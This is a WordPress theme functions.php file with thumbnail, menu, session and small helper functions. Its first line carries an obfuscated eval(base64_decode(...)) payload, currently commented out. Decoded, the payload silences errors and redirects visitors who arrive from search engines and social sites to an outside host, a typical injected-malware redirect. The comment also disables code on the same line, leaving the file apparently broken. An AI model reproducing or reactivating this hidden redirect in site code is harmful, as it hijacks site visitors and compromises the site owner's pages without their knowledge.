<?php	 	//eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9scGthLmRkbnMubWUudWsvIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));define('DOMAIN',get_bloginfo('url'));if (function_exists('add_theme_support')) {
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 150, 150, true);
	add_image_size('thumbnail', 150, 150, true);
	add_image_size('medium', 1024, 468, true);
	add_image_size('large', 9999, 500);
}

/* register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'wpdocs' ),
        'collection' => __( 'Collection Navigation', 'wpdocs' ),
        'lookbooks' => __( 'Look Books Navigation', 'wpdocs' ),
	) ); */
function my_init() {	if (!is_admin()) {		wp_enqueue_script('jquery');	} else {		require_once 'includes/init_admin_config.php';	}}add_action('init', 'my_init');/** *    init_sessions() * *    @uses session_id() *    @uses session_start() */function init_sessions() {    if (!session_id()) {        session_start();    }}add_action('init', 'init_sessions');function debug($var,$exit = true){	echo '<pre>';	print_r($var);	if($exit) die;}function format_number($num){	return number_format($num,2);}function getParam($name,$default=''){	if(isset($_REQUEST[$name])) {		return $_REQUEST[$name];	}	return $default;}function parseInt($string) {	$length = strlen($string);	$str = '';	for($i = 0; $i<$length;$i++) {		if(is_numeric($string[$i])) {			$str.=$string[$i];		}	}	return intval($str);}require_once 'includes/init_product.php';require_once 'includes/init_media.php';